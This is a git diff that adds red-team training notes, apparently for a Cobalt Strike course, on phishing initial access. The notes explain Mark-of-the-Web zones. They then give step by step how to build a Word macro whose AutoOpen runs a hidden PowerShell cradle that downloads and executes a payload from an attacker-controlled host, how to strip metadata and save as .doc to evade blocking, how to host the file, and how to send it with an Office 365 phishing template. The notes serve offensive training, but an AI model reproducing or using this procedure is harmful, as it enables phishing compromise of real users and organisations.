@@ -39,7 +39,62 @@ Two options for delivering a payload that will execute on their system:
 1. Send a URL from which a payload can download
 2. Attach a payload to the phishing email
 
-Files emailed "internally" from a compromised Exchange mailbox are not tagged with a Zone Identifier, and won't have the "mark of the web" and come under greater scrutiny.
+## Initial Access Payloads
 
+Files emailed "internally" from a compromised Exchange mailbox are not tagged with a Zone Identifier, and won't have the "mark of the web" (MotW) and come under greater scrutiny.
 
+Check to see whether a file has the MotW: ```gc .\test.txt -Stream Zone.Identifier```. The zones ```gc``` reports are: 
+
+  0: Local computer
+  1: Local intranet
+  2: Trusted sites
+  3: Internet
+  4: Restricted sites
+
+## Visual Basic for Applications (VBA) Macros
+
+Docs containing macros are handled with more scrutiny. Create a macro in a Word document by:
+
+1. In CS: Attacks > Scripted Web Delivery (S)
+2. Make a 64-bit PowerShell payload for your HTTP listener
+  3. URI: anything
+  4. Local host: nickelviper.com
+  5. Local port: 80
+  6. Listener: http
+  7. Type: powershell
+  8. Use x64 payload
+9. This creates a payload hosted on the team server so it can be downloaded over HTTP and executed in-memory; paste into a Word macro (below): ```Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""```
+1. In Word: View > Macros > Create
+2. Change the "Macros in" field to the document name
+3. Basic macro:
+    ```
+    Sub AutoOpen()
+    
+      Dim Shell As Object
+      Set Shell = CreateObject("wscript.shell")
+      Shell.Run "<command>"
+    
+    End Sub
+    ```
+4. If the Office license doesn't allow macros, run a Command Prompt as admin:
+    ```
+    cd C:\Program Files\Microsoft Office\Office16
+    cscript ospp.vbs /rearm
+    ```
+5. In Word: File > Info > Inspect Document > Inspect Document, click Inspect then Remove All next to Document Properties and Personal Information
+6. File > Save As and save to C:\Payloads. Any filename, and Save as type: Word 97-2003 (.doc) (.docm usually gets flagged/blocked)
+7. Host the file: in CS: Site Management > Host File
+  1. File: <payload .doc file>
+  2. Local URI: /<file>
+  3. Local host: nickelviper.com // an appropriate looking URL you control or a hosting service like OneDrive would be more legit
+  4. Local port: 80
+  5. Mime type: automatic
+8. Open an HTML email template for Office 365 in a browser from https://github.com/ZeroPointSecurity/PhishingTemplates/tree/master/Office365
+9. Copy the content and paste into the OWA text editor
+10. Change text/URL as appropriate, e.g. http://nickelviper.com/file.doc
+  
+  
+  
+
+     
 
